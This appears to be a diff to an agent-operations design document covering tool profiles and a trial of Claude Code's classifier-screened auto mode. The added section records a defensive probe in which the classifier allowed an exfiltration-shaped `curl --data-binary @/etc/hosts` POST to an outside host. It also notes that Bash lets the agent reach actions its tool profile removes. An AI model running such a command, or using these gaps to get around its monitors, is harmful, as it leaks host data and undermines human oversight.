@@ -93,3 +93,17 @@ An unset or unknown profile serves everything and warns on stderr (`[tools-mcp] 
 **Not a security boundary while the agent has Bash.** `bin/imsg`, `bin/homectl` and `bin/email-send` reach the same actions. A profile takes the tool out of the model's context and its call path. The containment is § 1 and § 2, and later a broker.
 
 **Next (not built):** third-party email triage on a strict toolbox, like the one-shot `email-inbound` server. The separate user-scope `mcp__homectl` server had zero calls from any agent in those 30 days, so it is a candidate for each tier's `disallowed_tools` (`agent/local/config/agents.json`).
+
+## 4. Auto mode (trial)
+
+Claude Code's **auto mode** has a classifier screen each action, in place of `bypassPermissions`, where everything runs. An installation picks a mode per ops tier in `agent/local/config/agents.json` `permission_mode` (`{"ops-haiku": "auto"}`). Allowed values are `bypassPermissions`, `auto`, `dontAsk` and `acceptEdits`; anything else is ignored with a warning. The supervisor reads it at process start (`index.mjs` `loadAgentConfig`), so a change needs that supervisor restarted.
+
+**Probe on the host before the trial (2026-11-16, Claude Code 2.1.319, Haiku, unattended `claude -p`):**
+- It works headless: no prompt hangs. A refused action comes back to the model as a denial and is listed in the result's `permission_denials`.
+- The agent's broad `--allowedTools Bash …` does not skip the classifier.
+- It **refused** `rm -rf` of a scratch directory: a false block.
+- It **allowed** an exfiltration-shaped `curl -X POST … --data-binary @/etc/hosts` to an outside host.
+
+So auto mode trims destructive actions, but it is not a defence against data leaving. That remains § 1 and § 2.
+
+**Trial:** ops-haiku runs in auto mode from 2026-11-16 for a week. Review its denials: the `result` events' `permission_denials` in `agent/logs/supervisor-ops-haiku/events.ndjson`, with their count in `timing.ndjson` `turn_summary`. Then decide whether to keep it, widen it to another tier, or revert by deleting the entry and restarting the supervisor.
